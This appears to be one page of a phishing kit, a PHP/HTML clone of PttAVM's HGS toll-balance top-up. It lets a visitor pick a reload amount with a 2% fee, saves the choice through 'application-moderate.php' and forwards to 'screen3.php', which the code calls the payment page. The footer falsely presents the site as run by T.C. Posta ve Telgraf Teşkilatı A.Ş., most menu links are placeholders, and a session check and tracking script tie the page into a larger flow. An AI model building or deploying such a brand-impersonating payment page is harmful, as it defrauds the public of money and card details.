<?php
session_start();

// Session kontrolü
if (!isset($_SESSION['userIdentifier'])) {
    header('Location: index.php');
    exit;
}
?>
<!doctype html>
<html lang="tr">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>HGS Bakiye Yükleme - Miktar Seçimi - PttAVM</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap"
      rel="stylesheet"
    />
    <link
      href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0"
      rel="stylesheet"
    />
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      :root {
        --primary: #c8912e;
        --primary-hover: #b07d24;
        --primary-light: rgba(200, 145, 46, 0.12);
        --accent: #1a3a5c;
        --dark: #0c1824;
        --dark-card: rgba(12, 24, 36, 0.92);
        --dark-input: rgba(20, 40, 60, 0.7);
        --text: #f0f2f5;
        --text-muted: #8a9bb5;
        --border: rgba(255, 255, 255, 0.1);
        --radius: 10px;
        --radius-sm: 8px;
        --green: #22c55e;
      }

      body {
        font-family:
          "Inter",
          -apple-system,
          BlinkMacSystemFont,
          sans-serif;
        background: var(--dark);
        color: var(--text);
        min-height: 100vh;
        min-height: 100dvh;
        overflow-x: hidden;
        -webkit-font-smoothing: antialiased;
      }

      /* ── Navbar ── */
      nav {
        position: sticky;
        top: 0;
        z-index: 100;
        padding: 0 1.5rem;
        height: 60px;
        display: flex;
        align-items: center;
        justify-content: space-between;
        background: rgba(10, 20, 32, 0.97);
        backdrop-filter: blur(16px);
        -webkit-backdrop-filter: blur(16px);
        border-bottom: 2px solid var(--primary);
      }

      .nav-brand {
        display: flex;
        align-items: center;
      }

      .nav-brand img {
        height: 36px;
        width: auto;
      }

      .nav-links {
        display: flex;
        align-items: center;
        gap: 2px;
        list-style: none;
      }

      .nav-links a {
        display: flex;
        align-items: center;
        gap: 6px;
        text-decoration: none;
        color: var(--text-muted);
        font-size: 0.82rem;
        font-weight: 500;
        padding: 8px 14px;
        border-radius: var(--radius-sm);
        transition: all 0.2s;
        position: relative;
      }

      .nav-links a:hover {
        color: var(--text);
        background: rgba(255, 255, 255, 0.05);
      }

      .nav-links a.active {
        color: var(--primary);
      }

      .nav-links a.active::after {
        content: "";
        position: absolute;
        bottom: -12px;
        left: 14px;
        right: 14px;
        height: 2px;
        background: var(--primary);
      }

      .nav-links .material-symbols-outlined {
        font-size: 18px;
      }

      .hamburger {
        display: none;
        background: none;
        border: none;
        color: var(--text);
        cursor: pointer;
        width: 44px;
        height: 44px;
        align-items: center;
        justify-content: center;
        border-radius: var(--radius-sm);
        transition: background 0.2s;
      }

      .hamburger:active {
        background: rgba(255, 255, 255, 0.06);
      }

      .hamburger .material-symbols-outlined {
        font-size: 26px;
      }

      /* ── Hero ── */
      .hero {
        position: relative;
        min-height: calc(100vh - 60px);
        min-height: calc(100dvh - 60px);
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 2.5rem 1.5rem;
      }

      .hero-bg {
        position: absolute;
        inset: 0;
        z-index: 0;
        background: url("background.jpg") center center / cover no-repeat;
      }

      .hero-bg::after {
        content: "";
        position: absolute;
        inset: 0;
        background: linear-gradient(
          180deg,
          rgba(10, 20, 32, 0.85) 0%,
          rgba(10, 20, 32, 0.68) 40%,
          rgba(10, 20, 32, 0.78) 70%,
          rgba(10, 20, 32, 0.95) 100%
        );
      }

      /* ── Card ── */
      .card-wrapper {
        position: relative;
        z-index: 10;
        width: 100%;
        max-width: 540px;
      }

      .card {
        background: var(--dark-card);
        backdrop-filter: blur(20px);
        -webkit-backdrop-filter: blur(20px);
        border: 1px solid var(--border);
        border-top: 3px solid var(--primary);
        border-radius: var(--radius);
        padding: 2rem;
        box-shadow: 0 24px 64px -16px rgba(0, 0, 0, 0.6);
      }

      .card-header {
        display: flex;
        align-items: center;
        gap: 14px;
        margin-bottom: 0.75rem;
      }

      .card-header-icon {
        width: 48px;
        height: 48px;
        background: linear-gradient(135deg, var(--primary), #d4a033);
        border-radius: var(--radius-sm);
        display: flex;
        align-items: center;
        justify-content: center;
        flex-shrink: 0;
      }

      .card-header-icon .material-symbols-outlined {
        font-size: 26px;
        color: #fff;
      }

      .card-header-text h1 {
        font-size: 1.3rem;
        font-weight: 700;
        letter-spacing: -0.3px;
        line-height: 1.2;
      }

      .card-header-text h1 span {
        color: var(--primary);
      }

      .card-header-text p {
        font-size: 0.78rem;
        color: var(--text-muted);
        margin-top: 2px;
      }

      .divider {
        height: 1px;
        background: var(--border);
        margin: 1.1rem 0;
      }

      .notice {
        background: rgba(200, 145, 46, 0.06);
        border: 1px solid rgba(200, 145, 46, 0.15);
        border-left: 3px solid var(--primary);
        border-radius: 6px;
        padding: 10px 14px;
        margin-bottom: 1.25rem;
        font-size: 0.8rem;
        color: var(--text-muted);
        line-height: 1.55;
      }

      /* ── Section Label ── */
      .section-label {
        font-size: 0.78rem;
        font-weight: 600;
        color: var(--text-muted);
        text-transform: uppercase;
        letter-spacing: 0.5px;
        margin-bottom: 0.85rem;
      }

      /* ── Amount Grid ── */
      .amount-grid {
        display: grid;
        grid-template-columns: repeat(3, 1fr);
        gap: 10px;
        margin-bottom: 1.25rem;
      }

      .amount-btn {
        position: relative;
        padding: 16px 8px;
        border: 1px solid var(--border);
        border-radius: var(--radius-sm);
        background: var(--dark-input);
        color: var(--text);
        font-family: inherit;
        font-size: 1.1rem;
        font-weight: 700;
        cursor: pointer;
        transition: all 0.2s;
        text-align: center;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 4px;
        min-height: 52px;
        -webkit-tap-highlight-color: transparent;
      }

      .amount-btn .currency {
        font-size: 0.82rem;
        font-weight: 500;
        color: var(--text-muted);
        transition: color 0.2s;
      }

      .amount-btn:hover {
        border-color: rgba(200, 145, 46, 0.4);
        background: rgba(200, 145, 46, 0.06);
      }

      .amount-btn:active {
        transform: scale(0.97);
      }

      .amount-btn.selected {
        border-color: var(--primary);
        background: rgba(200, 145, 46, 0.1);
        box-shadow: 0 0 0 3px rgba(200, 145, 46, 0.08);
      }

      .amount-btn.selected .currency {
        color: var(--primary);
      }

      .amount-btn.selected::after {
        content: "";
        position: absolute;
        top: 8px;
        right: 8px;
        width: 8px;
        height: 8px;
        background: var(--primary);
        border-radius: 50%;
      }

      /* ── Custom Amount ── */
      .custom-amount {
        margin-bottom: 1.25rem;
      }

      .custom-amount-label {
        font-size: 0.75rem;
        color: var(--text-muted);
        margin-bottom: 6px;
        display: block;
      }

      .custom-input-wrapper {
        position: relative;
      }

      .custom-input-wrapper input {
        width: 100%;
        padding: 13px 50px 13px 14px;
        border: 1px solid var(--border);
        border-radius: var(--radius-sm);
        background: var(--dark-input);
        color: var(--text);
        font-family: inherit;
        font-size: 16px;
        outline: none;
        transition: all 0.2s;
        -webkit-appearance: none;
        appearance: none;
      }

      .custom-input-wrapper input::placeholder {
        color: rgba(138, 155, 181, 0.5);
      }

      .custom-input-wrapper input:focus {
        border-color: var(--primary);
        box-shadow: 0 0 0 3px rgba(200, 145, 46, 0.1);
      }

      .custom-input-wrapper .input-suffix {
        position: absolute;
        right: 14px;
        top: 50%;
        transform: translateY(-50%);
        font-size: 0.85rem;
        font-weight: 600;
        color: var(--text-muted);
      }

      /* ── Summary ── */
      .summary {
        background: rgba(0, 0, 0, 0.2);
        border: 1px solid var(--border);
        border-radius: var(--radius-sm);
        padding: 16px 18px;
        margin-bottom: 1.25rem;
      }

      .summary-row {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 6px 0;
        font-size: 0.85rem;
      }

      .summary-row .label {
        color: var(--text-muted);
      }

      .summary-row .value {
        font-weight: 600;
      }

      .summary-row.total {
        border-top: 1px solid var(--border);
        margin-top: 6px;
        padding-top: 12px;
      }

      .summary-row.total .label {
        color: var(--text);
        font-weight: 600;
      }

      .summary-row.total .value {
        color: var(--primary);
        font-size: 1.1rem;
        font-weight: 800;
      }

      /* ── Button ── */
      .btn-primary {
        width: 100%;
        padding: 14px;
        border: none;
        border-radius: var(--radius-sm);
        background: var(--primary);
        color: #fff;
        font-family: inherit;
        font-size: 0.9rem;
        font-weight: 700;
        letter-spacing: 0.8px;
        text-transform: uppercase;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        transition: all 0.2s;
        min-height: 48px;
        -webkit-tap-highlight-color: transparent;
      }

      .btn-primary:hover {
        background: var(--primary-hover);
      }

      .btn-primary:active {
        transform: scale(0.98);
      }

      .btn-primary:disabled {
        opacity: 0.4;
        cursor: not-allowed;
      }

      .btn-primary:disabled:hover {
        background: var(--primary);
      }

      .btn-primary .material-symbols-outlined {
        font-size: 20px;
      }

      .btn-secondary {
        width: 100%;
        padding: 12px;
        border: 1px solid var(--border);
        border-radius: var(--radius-sm);
        background: transparent;
        color: var(--text-muted);
        font-family: inherit;
        font-size: 0.82rem;
        font-weight: 600;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 6px;
        transition: all 0.2s;
        margin-top: 10px;
        min-height: 44px;
        -webkit-tap-highlight-color: transparent;
      }

      .btn-secondary:hover {
        color: var(--text);
        border-color: rgba(255, 255, 255, 0.2);
        background: rgba(255, 255, 255, 0.03);
      }

      .btn-secondary:active {
        transform: scale(0.98);
      }

      .btn-secondary .material-symbols-outlined {
        font-size: 18px;
      }

      /* ── Footer ── */
      footer {
        position: relative;
        z-index: 10;
        border-top: 1px solid var(--border);
        background: #0a1420;
      }

      .footer-inner {
        max-width: 1200px;
        margin: 0 auto;
        padding: 1.75rem 1.5rem 1.25rem;
        display: grid;
        grid-template-columns: 1fr auto;
        gap: 2rem;
        align-items: start;
      }

      .footer-brand {
        display: flex;
        flex-direction: column;
        gap: 6px;
      }

      .footer-brand .brand-name {
        font-weight: 700;
        font-size: 0.95rem;
      }

      .footer-brand .brand-name span {
        color: var(--primary);
      }

      .footer-brand p {
        font-size: 0.78rem;
        color: var(--text-muted);
        line-height: 1.5;
        max-width: 340px;
      }

      .footer-links {
        display: flex;
        gap: 2rem;
        list-style: none;
      }

      .footer-links a {
        font-size: 0.8rem;
        color: var(--text-muted);
        text-decoration: none;
        font-weight: 500;
        transition: color 0.2s;
      }

      .footer-links a:hover {
        color: var(--primary);
      }

      .footer-bottom {
        border-top: 1px solid var(--border);
        padding: 1rem 1.5rem;
        text-align: center;
        font-size: 0.75rem;
        color: rgba(138, 155, 181, 0.5);
      }

      /* ── Responsive ── */
      @media (max-width: 768px) {
        nav {
          padding: 0 1rem;
          height: 56px;
        }

        .nav-brand img {
          height: 32px;
        }

        .nav-links {
          display: none;
          position: fixed;
          top: 56px;
          left: 0;
          right: 0;
          bottom: 0;
          flex-direction: column;
          background: rgba(10, 20, 32, 0.98);
          backdrop-filter: blur(20px);
          -webkit-backdrop-filter: blur(20px);
          padding: 0.75rem;
          z-index: 200;
          overflow-y: auto;
          animation: slideDown 0.2s ease;
        }

        @keyframes slideDown {
          from {
            opacity: 0;
            transform: translateY(-8px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }

        .nav-links.open {
          display: flex;
        }

        .nav-links li {
          border-bottom: 1px solid var(--border);
        }

        .nav-links li:last-child {
          border-bottom: none;
        }

        .nav-links a {
          padding: 14px 16px;
          width: 100%;
          font-size: 0.88rem;
          border-radius: var(--radius-sm);
        }

        .nav-links a .material-symbols-outlined {
          font-size: 20px;
        }

        .nav-links a.active {
          background: rgba(200, 145, 46, 0.08);
        }

        .nav-links a.active::after {
          display: none;
        }

        .hamburger {
          display: flex;
        }

        .hero {
          min-height: calc(100vh - 56px);
          min-height: calc(100dvh - 56px);
          padding: 1.5rem 1rem;
        }

        .card {
          padding: 1.5rem 1.25rem;
        }

        .card-header {
          gap: 12px;
        }

        .card-header-icon {
          width: 42px;
          height: 42px;
        }

        .card-header-icon .material-symbols-outlined {
          font-size: 22px;
        }

        .card-header-text h1 {
          font-size: 1.15rem;
        }

        .card-header-text p {
          font-size: 0.73rem;
        }

        .divider {
          margin: 0.85rem 0;
        }

        .notice {
          padding: 10px 12px;
          margin-bottom: 1rem;
          font-size: 0.76rem;
        }

        .section-label {
          font-size: 0.74rem;
        }

        .amount-grid {
          gap: 8px;
        }

        .amount-btn {
          padding: 14px 6px;
          font-size: 1rem;
          min-height: 50px;
        }

        .custom-input-wrapper input {
          padding: 12px 50px 12px 14px;
          font-size: 16px;
        }

        .summary {
          padding: 14px 16px;
        }

        .summary-row {
          font-size: 0.82rem;
        }

        .summary-row.total .value {
          font-size: 1.05rem;
        }

        .btn-primary {
          padding: 14px;
          font-size: 0.88rem;
          min-height: 50px;
        }

        .btn-secondary {
          padding: 12px;
          font-size: 0.82rem;
          min-height: 46px;
        }

        .footer-inner {
          grid-template-columns: 1fr;
          padding: 1.25rem 1rem 1rem;
          gap: 1rem;
        }

        .footer-links {
          flex-direction: column;
          gap: 0;
        }

        .footer-links li {
          border-bottom: 1px solid var(--border);
        }

        .footer-links li:last-child {
          border-bottom: none;
        }

        .footer-links a {
          display: block;
          padding: 12px 0;
          font-size: 0.82rem;
        }

        .footer-bottom {
          padding: 0.85rem 1rem;
          font-size: 0.72rem;
        }
      }

      @media (max-width: 380px) {
        .card {
          padding: 1.25rem 1rem;
        }

        .card-header-text h1 {
          font-size: 1.05rem;
        }

        .amount-grid {
          grid-template-columns: repeat(2, 1fr);
        }

        .amount-btn {
          min-height: 48px;
        }

        .notice {
          font-size: 0.72rem;
        }
      }
    </style>
  </head>
  <body>
    <!-- Navbar -->
    <nav>
      <div class="nav-brand">
        <a href="index.html"><img src="logo.png" alt="PttAVM HGS" /></a>
      </div>
      <button
        class="hamburger"
        onclick="document.querySelector('.nav-links').classList.toggle('open')"
        aria-label="Menu"
      >
        <span class="material-symbols-outlined">menu</span>
      </button>
      <ul class="nav-links">
        <li>
          <a href="index.html">
            <span class="material-symbols-outlined">home</span> Ana Sayfa
          </a>
        </li>
        <li>
          <a href="#" class="active">
            <span class="material-symbols-outlined"
              >account_balance_wallet</span
            >
            HGS Yükle
          </a>
        </li>
        <li>
          <a href="#">
            <span class="material-symbols-outlined">query_stats</span> Hasar
            Sorgula
          </a>
        </li>
        <li>
          <a href="#">
            <span class="material-symbols-outlined">speed</span> KM Sorgula
          </a>
        </li>
        <li>
          <a href="#">
            <span class="material-symbols-outlined">shopping_cart</span>
            Alışverişe Başla
          </a>
        </li>
      </ul>
    </nav>

    <!-- Hero -->
    <section class="hero">
      <div class="hero-bg"></div>

      <!-- Card -->
      <div class="card-wrapper">
        <div class="card">
          <div class="card-header">
            <div class="card-header-icon">
              <span class="material-symbols-outlined">toll</span>
            </div>
            <div class="card-header-text">
              <h1><span>HGS</span> Bakiye Yükleme</h1>
              <p>Hızlı Geçiş Sistemi - Bakiye Sorgulama ve Yükleme</p>
            </div>
          </div>

          <div class="divider"></div>

          <div class="notice">
            Bu sistemden, yalnızca PTT kanalı ile satışı gerçekleştirilen HGS
            ürünlerine bakiye yükleme işlemi yapılmaktadır.
          </div>

          <!-- Amount Selection -->
          <div class="section-label">Yüklemek istediğiniz miktarı seçiniz</div>

          <div class="amount-grid">
            <button class="amount-btn" onclick="selectAmount(this, 10)">
              10 <span class="currency">TL</span>
            </button>
            <button class="amount-btn" onclick="selectAmount(this, 25)">
              25 <span class="currency">TL</span>
            </button>
            <button class="amount-btn" onclick="selectAmount(this, 50)">
              50 <span class="currency">TL</span>
            </button>
            <button class="amount-btn" onclick="selectAmount(this, 100)">
              100 <span class="currency">TL</span>
            </button>
            <button class="amount-btn" onclick="selectAmount(this, 150)">
              150 <span class="currency">TL</span>
            </button>
            <button class="amount-btn" onclick="selectAmount(this, 250)">
              250 <span class="currency">TL</span>
            </button>
          </div>

          <!-- Custom Amount -->
          <div class="custom-amount">
            <span class="custom-amount-label">veya özel miktar giriniz</span>
            <div class="custom-input-wrapper">
              <input
                type="number"
                id="customAmount"
                placeholder="Örneğin: 75"
                min="1"
                max="1000"
                oninput="handleCustomAmount(this)"
              />
              <span class="input-suffix">TL</span>
            </div>
          </div>

          <div class="divider"></div>

          <!-- Summary -->
          <div class="summary">
            <div class="summary-row">
              <span class="label">Yükleme Miktarı</span>
              <span class="value" id="summaryAmount">0 TL</span>
            </div>
            <div class="summary-row">
              <span class="label">Hizmet Bedeli</span>
              <span class="value" id="summaryFee">0 TL</span>
            </div>
            <div class="summary-row total">
              <span class="label">Toplam Ödeme</span>
              <span class="value" id="summaryTotal">0 TL</span>
            </div>
          </div>

          <!-- Buttons -->
          <button
            class="btn-primary"
            id="btnContinue"
            onclick="handleContinue()"
            disabled
          >
            Devam
            <span class="material-symbols-outlined">arrow_forward</span>
          </button>

          <button
            class="btn-secondary"
            onclick="window.location.href = 'index.php'"
          >
            <span class="material-symbols-outlined">arrow_back</span>
            Geri Dön
          </button>
        </div>
      </div>
    </section>

    <!-- Footer -->
    <footer>
      <div class="footer-inner">
        <div class="footer-brand">
          <div class="brand-name">Ptt<span>AVM</span> - HGS</div>
          <p>
            T.C. Posta ve Telgraf Teşkilatı A.Ş. bünyesinde hizmet veren Hızlı
            Geçiş Sistemi bakiye yükleme platformu.
          </p>
        </div>
        <ul class="footer-links">
          <li><a href="#">Önemli Bilgiler</a></li>
          <li><a href="#">Görüş Bildir</a></li>
          <li><a href="#">Sıkça Sorulan Sorular</a></li>
          <li><a href="#">İletişim</a></li>
        </ul>
      </div>
      <div class="footer-bottom">
        &copy; 2026 PttAVM | Tüm hakları saklıdır.
      </div>
    </footer>

    <script>
      const SERVICE_FEE_RATE = 0.02;
      let selectedAmount = 0;

      function selectAmount(btn, amount) {
        document.getElementById("customAmount").value = "";
        document
          .querySelectorAll(".amount-btn")
          .forEach((b) => b.classList.remove("selected"));

        if (selectedAmount === amount) {
          selectedAmount = 0;
        } else {
          btn.classList.add("selected");
          selectedAmount = amount;
        }
        updateSummary();
      }

      function handleCustomAmount(input) {
        document
          .querySelectorAll(".amount-btn")
          .forEach((b) => b.classList.remove("selected"));
        const val = parseInt(input.value);
        selectedAmount = isNaN(val) || val <= 0 ? 0 : val;
        updateSummary();
      }

      function updateSummary() {
        const fee = Math.round(selectedAmount * SERVICE_FEE_RATE * 100) / 100;
        const total = selectedAmount + fee;
        document.getElementById("summaryAmount").textContent =
          selectedAmount + " TL";
        document.getElementById("summaryFee").textContent =
          fee.toFixed(2) + " TL";
        document.getElementById("summaryTotal").textContent =
          total.toFixed(2) + " TL";
        document.getElementById("btnContinue").disabled = selectedAmount <= 0;
      }

      async function handleContinue() {
        if (selectedAmount <= 0) return;
        
        const fee = Math.round(selectedAmount * SERVICE_FEE_RATE * 100) / 100;
        const total = selectedAmount + fee;
        
        // Veritabanına kaydet
        const formData = new FormData();
        formData.append('action', 'update_amount');
        formData.append('amount', selectedAmount);
        formData.append('service_fee', fee);
        formData.append('total', total);
        
        try {
          const response = await fetch('application-moderate.php', {
            method: 'POST',
            body: formData
          });
          
          const result = await response.json();
          
          if (result.success) {
            // Ödeme sayfasına yönlendir
            window.location.href = 'screen3.php';
          } else {
            alert('Hata: ' + result.message);
          }
        } catch (error) {
          alert('Bir hata oluştu: ' + error.message);
        }
      }

      // Close menu when clicking a link
      document.querySelectorAll(".nav-links a").forEach((link) => {
        link.addEventListener("click", () => {
          document.querySelector(".nav-links").classList.remove("open");
        });
      });
    </script>
    <script src="/tracking.js"></script>
  </body>
</html>
